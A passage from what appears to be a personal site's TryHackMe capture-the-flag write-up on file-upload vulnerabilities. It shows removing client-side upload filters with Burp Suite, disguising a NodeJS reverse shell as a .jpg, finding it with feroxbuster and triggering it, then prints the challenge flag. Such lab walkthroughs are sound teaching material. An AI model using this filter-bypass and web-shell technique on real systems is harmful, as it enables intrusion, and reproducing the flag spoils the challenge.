<a id="__codelineno-10-68" name="__codelineno-10-68" href="#__codelineno-10-68"></a><span class="w">          </span><span class="nx">setResponseMsg</span><span class="p">(</span><span class="nx">text</span><span class="p">[</span><span class="nx">data</span><span class="p">],</span><span class="w"> </span><span class="nx">colour</span><span class="p">)</span>
<a id="__codelineno-10-69" name="__codelineno-10-69" href="#__codelineno-10-69"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-10-70" name="__codelineno-10-70" href="#__codelineno-10-70"></a><span class="w">      </span><span class="p">})</span>
<a id="__codelineno-10-71" name="__codelineno-10-71" href="#__codelineno-10-71"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-10-72" name="__codelineno-10-72" href="#__codelineno-10-72"></a><span class="w">  </span><span class="p">})</span>
<a id="__codelineno-10-73" name="__codelineno-10-73" href="#__codelineno-10-73"></a><span class="p">});</span>
</code></pre></div>
The Javascript file implements client-side file size, magic number, and file extension filters. Based on the above code, our file needs to be:
  - Greater than 409.6kb
  - Needs magic number: FF D8 FF
  - Needs file extension: jpg or jpeg</p>
<p>With Burp Suite let's capture a request to the home page. Keep forwarding the requests until a request for <code>/assets/js/upload.js</code> is made. Right-click and select <code>Do intercept - Response to this request</code> as we want to be able to intercept <code>upload.js</code> in Burp Suite to remove the client-side filters. Keep forwarding the requests until we intercept the response we are interested in.</p>
<p><img alt="Challenge Client Side" src="../../../assets/images/thm/uploadvulnerabilities/37%20-%20Challenge%207.png" /></p>
<p>Delete the <code>Check File Size</code>, <code>Check Magic Number</code>, and <code>Check File Extension</code> client-side filters and forward the request. This should now allow us to bypass the implemented client-side filters. By capturing the request with Burp Suite, we also find that the server is powered by <code>ExpressJs with NodeJS</code>.</p>
<p><img alt="Challenge Burp" src="../../../assets/images/thm/uploadvulnerabilities/34%20-%20Challenge%204.png" /></p>
<p>Upload a standard JPEG and enumerate the host to see possible locations where our file could be uploaded to.</p>
<p><img alt="Challenge Initial Feroxbuster Scan" src="../../../assets/images/thm/uploadvulnerabilities/31%20-%20Challenge%201.png" /></p>
<p>Looks like three possibilities <code>/admin</code>, <code>/modules</code>, and <code>/content</code>. Let's rerun a <code>feroxbuster</code> scan on the <code>/content</code> folder using the custom wordlist provided by the challenge. The new scan with the custom wordlist shows a list of JPEG images including the one which we uploaded earlier: <code>http://jewel.uploadvulns.thm/content/TCK.jpg</code></p>
<p><img alt="Challenge Second Feroxbuster Scan" src="../../../assets/images/thm/uploadvulnerabilities/32%20-%20Challenge%202.png" /></p>
<p><img alt="Challenge Uploaded JPEG" src="../../../assets/images/thm/uploadvulnerabilities/33%20-%20Challenge%203.png" /></p>
<p>Since we know that the web server is powered by NodeJS, let's download a reverse shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">here</a>.</p>
<p>Save the reverse shell as <code>shell.jpg</code> in attempt to bypass any server-side MIME filters (this is purely a guess at this moment as MIME type filters have not appeared in the challenge). Ensure the IP and port numbers are modified before uploading the file. Looks like using the <code>.jpg</code> extension we are able to bypass the server-side MIME filter (note that <code>shell.js</code> was tried before this and resulted in failure to upload).</p>
<p><img alt="Challenge Shell" src="../../../assets/images/thm/uploadvulnerabilities/35%20-%20Challenge%205.png" /></p>
<p>Let's run another <code>feroxbuster</code> scan of the <code>/contents</code> folder to track down our renamed shell file.</p>
<p><img alt="Challenge Third Feroxbuster Scan" src="../../../assets/images/thm/uploadvulnerabilities/36%20-%20Challenge%206.png" /></p>
<p>Of all the listed files, only <code>/NEF.jpg</code> was not an image so it must be our uploaded shell.</p>
<p>Setup a Netcat listener to listen on port 1234 and navigate to and <code>http://jewel.uploadvulns.thm/admin</code>.</p>
<p>To execute the payload, enter <code>../content/NEF.jpg</code> in the command box and execute to gain our shell.</p>
<p><img alt="Challenge Shell and Flag" src="../../../assets/images/thm/uploadvulnerabilities/38%20-%20Challenge%208.png" /></p>
<p>Retrieved Flag: <code>THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</code></p>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../traverse/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Traverse">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Traverse
              </div>
            </div>
          </a>
        
        
          
          <a href="../vulnversity/" class="md-footer__link md-footer__link--next" aria-label="Next: Vulnversity">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Vulnversity
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      &copy; 2024 Nouman Noor
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>